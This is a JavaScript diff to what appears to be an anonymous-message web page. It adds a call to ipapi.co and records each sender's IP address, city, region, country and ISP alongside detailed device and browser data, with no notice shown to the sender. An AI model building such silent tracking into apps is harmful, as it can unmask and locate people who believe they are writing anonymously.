@@ -153,20 +153,42 @@ function getDeviceInfo(){
 
   return{device,os,browser,type,lang,tz,screen:scr,referrer,rawUA:ua.substring(0,120)};
 }
-
+async function getIPInfo(){
+  try{
+    const res = await fetch('https://ipapi.co/json/');
+    return await res.json();
+  }catch(e){
+    return {};
+  }
+}
 function toggleIG(){
   igOn=!igOn;
   document.getElementById('tbox').classList.toggle('on',igOn);
   document.getElementById('ig-input-wrap').classList.toggle('show',igOn);
 }
 
-function sendMsg(){
+async function sendMsg(){
   const msg=document.getElementById('msg').value.trim();
   if(!msg){document.getElementById('msg').style.borderColor='rgba(255,100,100,0.6)';return;}
   document.getElementById('msg').style.borderColor='';
   const ig=igOn?document.getElementById('ig-val').value.trim():null;
-  const deviceInfo=getDeviceInfo();
-  const entry={id:Date.now(),message:msg,instagram:ig||null,device:deviceInfo,time:new Date().toLocaleString()};
+const deviceInfo=getDeviceInfo();
+
+const ipInfo = await getIPInfo();
+  const entry={
+  id:Date.now(),
+  message:msg,
+  instagram:ig||null,
+  device:deviceInfo,
+
+  ip: ipInfo.ip || 'Unknown',
+  city: ipInfo.city || 'Unknown',
+  region: ipInfo.region || 'Unknown',
+  country: ipInfo.country_name || 'Unknown',
+  isp: ipInfo.org || 'Unknown',
+
+  time:new Date().toLocaleString()
+};
   entries.unshift(entry);
   try{localStorage.setItem('ngl_v4',JSON.stringify(entries));}catch(e){}
 
